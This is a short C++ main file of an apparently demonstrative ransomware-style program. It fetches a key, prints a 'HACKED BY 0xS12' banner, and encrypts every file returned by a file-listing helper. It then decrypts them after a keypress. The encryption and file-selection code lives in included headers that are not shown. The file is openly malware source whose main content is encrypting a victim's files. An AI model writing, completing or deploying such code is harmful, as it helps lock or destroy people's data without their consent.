#include <iostream> 
#include <fstream>
#include <vector>
#include <conio.h>
#include "encryptOPS.h"
#include "key.h"
#include "listfiles.h"
#include "banner.h"

using namespace std;

int main(){

    string key = getkey();
	encryptOPS enc = encryptOPS("", key.c_str());

    banner("HACKED BY 0xS12");

    vector<string> files;
    files = getfiles();

    for (int i = 0; i < files.size(); i++){
        enc.setFile(files[i]);
        enc.encrypt();
    }

    cout << "Press any key to continue..." << endl;
    getch();
    cout << "Decrypting files..." << endl;
    files = getfiles();
    for (int i = 0; i < files.size(); i++){
        enc.setFile(files[i]);
        enc.decrypt();
    }

    return 0;
}


